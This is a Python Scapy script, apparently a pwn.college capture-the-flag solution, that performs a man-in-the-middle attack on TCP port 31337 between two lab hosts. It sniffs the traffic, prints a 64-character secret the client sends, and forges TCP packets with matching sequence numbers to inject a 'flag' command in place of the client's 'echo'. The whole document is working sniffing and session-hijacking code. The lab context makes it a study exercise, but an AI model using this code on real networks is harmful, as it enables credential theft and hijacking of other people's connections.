#!/usr/bin/env python3
from scapy.all import *
import time
from collections import defaultdict

# Configuration
INTERFACE = "eth0"
TARGET_PORT = 31337
CLIENT_IP = "10.0.0.2"
SERVER_IP = "10.0.0.3"

# State tracking
connections = defaultdict(dict)

def packet_callback(pkt):
    if not pkt.haslayer(IP) or not pkt.haslayer(TCP):
        return

    src_ip = pkt[IP].src
    dst_ip = pkt[IP].dst
    sport = pkt[TCP].sport
    dport = pkt[TCP].dport

    # Only care about our target traffic
    if dport != TARGET_PORT and sport != TARGET_PORT:
        return

    conn_id = (src_ip, dst_ip, sport, dport)
    reverse_id = (dst_ip, src_ip, dport, sport)

    if pkt.haslayer(Raw):
        try:
            load = pkt[Raw].load.decode('utf-8', errors='ignore')
        except:
            return

        print(f"\n[Packet] {src_ip}:{sport} -> {dst_ip}:{dport}")
        print(f"Payload: {load}")

        # Server sending secret prompt
        if "secret: " in load:
            connections[conn_id]['state'] = 'awaiting_secret'
            print("[+] Server requested secret")

        # Client sending secret
        elif len(load.strip()) == 64 and connections.get(reverse_id, {}).get('state') == 'awaiting_secret':
            print(f"[+] Client sent secret: {load.strip()}")
            connections[reverse_id]['state'] = 'secret_received'
            connections[reverse_id]['secret'] = load.strip()

        # Server sending command prompt
        elif "command: " in load and connections.get(conn_id, {}).get('state') == 'secret_received':
            print("[+] Server requested command")
            connections[conn_id]['state'] = 'awaiting_command'
            # Craft our flag packet to be sent before client's echo
            flag_pkt = Ether(src=pkt[Ether].dst, dst=pkt[Ether].src)/\
                       IP(src=pkt[IP].dst, dst=pkt[IP].src)/\
                       TCP(sport=pkt[TCP].dport, 
                           dport=pkt[TCP].sport,
                           seq=pkt[TCP].ack,
                           ack=pkt[TCP].seq + len(b"command: "),
                           flags="PA")/\
                       b"flag\n"
            
            # Send our packet before client responds
            sendp(flag_pkt, iface=INTERFACE, verbose=0)
            print("[+] Injected flag command")

        # Client sending command
        elif connections.get(reverse_id, {}).get('state') == 'awaiting_command':
            if "echo" in load.lower():
                print("[+] Intercepting 'echo' command")
                
                # Create new flag command packet
                flag_pkt = IP(src=src_ip, dst=dst_ip)/\
                          TCP(sport=sport, dport=dport,
                              seq=pkt[TCP].seq,
                              ack=pkt[TCP].ack,
                              flags="PA")/\
                          b"flag\n"
                
                send(flag_pkt, iface=INTERFACE, verbose=0)
                connections[reverse_id]['state'] = 'command_sent'
                return  # Drop original packet

        # Server sending flag
        elif "pwn.college{" in load.lower():
            print(f"\n[+++] FLAG: {load.strip()}\n")

    # Forward packet if we didn't handle it
    send(pkt, iface=INTERFACE, verbose=0)

if __name__ == "__main__":
    print(f"[*] Starting MITM on port {TARGET_PORT}...")
    
    # Set more aggressive sniffing parameters
    sniff_filter = f"tcp port {TARGET_PORT} and (host {CLIENT_IP} or host {SERVER_IP})"
    print(f"[*] Using filter: {sniff_filter}")
    
    sniff(iface=INTERFACE,
          filter=sniff_filter,
          prn=packet_callback,
          store=0)
